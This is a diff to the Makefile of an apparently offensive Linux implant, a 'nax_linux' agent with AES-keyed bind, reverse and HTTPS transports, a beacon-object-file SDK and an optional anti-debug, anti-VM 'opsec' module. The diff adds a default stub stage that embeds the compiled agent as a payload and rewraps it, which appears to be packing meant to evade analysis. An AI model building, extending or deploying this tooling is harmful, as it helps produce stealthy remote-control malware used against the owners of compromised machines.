@@ -11,12 +11,10 @@
 #        NAX_AES_KEY=<32hexchars> NAX_LISTENER_WM=0xdeadbeef
 #
 # Add NAX_DEBUG=1 to either for verbose debug output (prints to stderr).
+# Add NAX_OPSEC=1 to enable anti-debug/anti-VM.
+# The agent is always wrapped with the stub except when NAX_FORMAT=so.
 
 CC           ?= gcc
-# Derive STRIP from CC for cross-compilation
-# arm-linux-gnueabihf-gcc -> arm-linux-gnueabihf-strip
-# aarch64-linux-gnu-gcc   -> aarch64-linux-gnu-strip
-# gcc                     -> strip
 STRIP        ?= $(patsubst %-gcc,%-strip,$(filter %-gcc,$(CC)))
 ifeq ($(STRIP),)
   STRIP      := strip
@@ -33,11 +31,16 @@ NAX_FORMAT      ?= elf
 NAX_OPSEC       ?= 0
 NAX_SLEEP_MS    ?= 5000
 NAX_JITTER_PCT  ?= 0
+NAX_STUB        ?= 1
+
+STUB_DIR        := src/stub
+STUB_SRC        := $(STUB_DIR)/stub.c
+STUB_PAYLOAD    := $(STUB_DIR)/stub_payload.h
+STUB_GEN        := $(STUB_DIR)/gen_stub_payload.sh
 
 BOF_SDK_DIR := deps/elf-bof
 BOF_SDK_INC := $(BOF_SDK_DIR)/include
 
-# ===== base CFLAGS =====
 CFLAGS := -D_GNU_SOURCE -Os -Wall -Wextra -I $(BOF_SDK_INC) \
           -Wno-unused-parameter \
           -Wno-stringop-truncation \
@@ -56,14 +59,13 @@ CFLAGS := -D_GNU_SOURCE -Os -Wall -Wextra -I $(BOF_SDK_INC) \
 LDFLAGS := -pie -Wl,-Bstatic -lpthread -lz -Wl,-Bdynamic -Wl,-z,relro,-z,now -Wl,-z,noexecstack
 OUTDIR  := _bin
 
-# Select library for target architecture
 ifeq ($(CC),aarch64-linux-gnu-gcc)
   BOF_SDK_LIB := $(BOF_SDK_DIR)/lib/libelf_bof_arm64.a
 else
   BOF_SDK_LIB := $(BOF_SDK_DIR)/lib/libelf_bof_x64.a
 endif
 
-# ===== mode suffix (must be set before debug suffix) =====
+# ===== mode =====
 ifeq ($(NAX_TCP_MODE),bind)
   CFLAGS  += -DNAX_TCP_MODE_BIND \
              -DNAX_BIND_PORT=$(NAX_BIND_PORT) \
@@ -86,14 +88,9 @@ else ifeq ($(NAX_TCP_MODE),https)
              src/Commands/zip.c \
              src/Transport/https.c \
              src/Transport/https_profile.c
-  # OpenSSL: locate the correct library path for the target architecture.
-  # On Debian/Ubuntu multiarch systems, cross-arch libs live under
-  # /usr/lib/<triplet>/  and headers under /usr/include/<triplet>/.
-  # Fall back to the default system paths for native x86_64 builds.
   ifneq ($(OPENSSL_INC),)
     CFLAGS += -I$(OPENSSL_INC)
   endif
-
   ifeq ($(CC),aarch64-linux-gnu-gcc)
     OPENSSL_TRIPLET := aarch64-linux-gnu
   else
@@ -104,7 +101,6 @@ else ifeq ($(NAX_TCP_MODE),https)
     LDFLAGS       = -pie -Wl,-Bstatic -lpthread -lz -Wl,-Bdynamic \
                     -L/usr/lib/$(OPENSSL_TRIPLET) -lssl -lcrypto -Wl,-z,relro,-z,now -Wl,-z,noexecstack
   else
-    # Native x86_64 — use system default paths
     LDFLAGS       = -pie -Wl,-Bstatic -lpthread -lz -Wl,-Bdynamic -lssl -lcrypto -Wl,-z,relro,-z,now -Wl,-z,noexecstack
   endif
   LDFLAGS_EXTRA :=
@@ -120,19 +116,24 @@ else
   LDFLAGS_EXTRA :=
 endif
 
-# ===== opsec (anti-debug, anti-VM, self-destruct) =====
+# ===== opsec =====
 ifeq ($(NAX_OPSEC),1)
   CFLAGS  += -DNAX_OPSEC=1
   SRCS    += src/Opsec/opsec.c
 endif
 
-# ===== debug suffix (appended AFTER mode suffix) =====
+# ===== stub =====
+ifeq ($(NAX_FORMAT),so)
+  NAX_STUB := 0
+endif
+
+# ===== debug =====
 ifeq ($(NAX_DEBUG),1)
   CFLAGS  += -DNAX_DEBUG -g -O0
   SUFFIX  := $(SUFFIX)_debug
 endif
 
-# ===== output format: elf (executable) or so (shared library) =====
+# ===== format =====
 ifeq ($(NAX_FORMAT),so)
   SRCS   += src/shared.c
   CFLAGS := $(subst -fPIE,-fPIC,$(CFLAGS))
@@ -144,17 +145,46 @@ endif
 
 TARGET  := $(OUTDIR)/nax_linux$(SUFFIX)
 
-.PHONY: all clean
+.PHONY: all clean _build
 
-all: $(OUTDIR)
+all: clean
+	@$(MAKE) --no-print-directory _build
+
+ifeq ($(NAX_STUB),1)
+_build: $(OUTDIR) $(OUTDIR)/.stub_built
+else
+_build: $(OUTDIR) $(TARGET)
+	@echo "[+] Built: $(TARGET)"
+endif
+
+# --- 1. Agente ---
+$(TARGET): $(SRCS)
 	$(CC) $(CFLAGS) $(SRCS) -o $(TARGET) $(BOF_SDK_LIB) $(LDFLAGS) $(LDFLAGS_EXTRA)
 ifeq ($(NAX_DEBUG),0)
 	$(STRIP) $(TARGET)
 endif
-	@echo "[+] Built: $(TARGET)"
 
 $(OUTDIR):
 	mkdir -p $(OUTDIR)
 
+# --- 2. Stub (solo si NAX_STUB=1) ---
+ifeq ($(NAX_STUB),1)
+
+$(STUB_PAYLOAD): $(TARGET) $(STUB_GEN)
+	@echo "[+] Generating stub payload from $(TARGET)"
+	@cd $(STUB_DIR) && bash gen_stub_payload.sh ../../$(TARGET) >/dev/null
+
+$(OUTDIR)/.stub_built: $(TARGET) $(STUB_PAYLOAD) $(STUB_SRC)
+	@echo "[+] Wrapping $(TARGET) with stub"
+	$(CC) $(CFLAGS) $(STUB_SRC) -o $(TARGET)
+ifeq ($(NAX_DEBUG),0)
+	$(STRIP) $(TARGET)
+endif
+	@touch $@
+	@echo "[+] Built: $(TARGET)"
+
+endif
+
 clean:
 	rm -rf $(OUTDIR)
+	rm -f $(STUB_PAYLOAD)
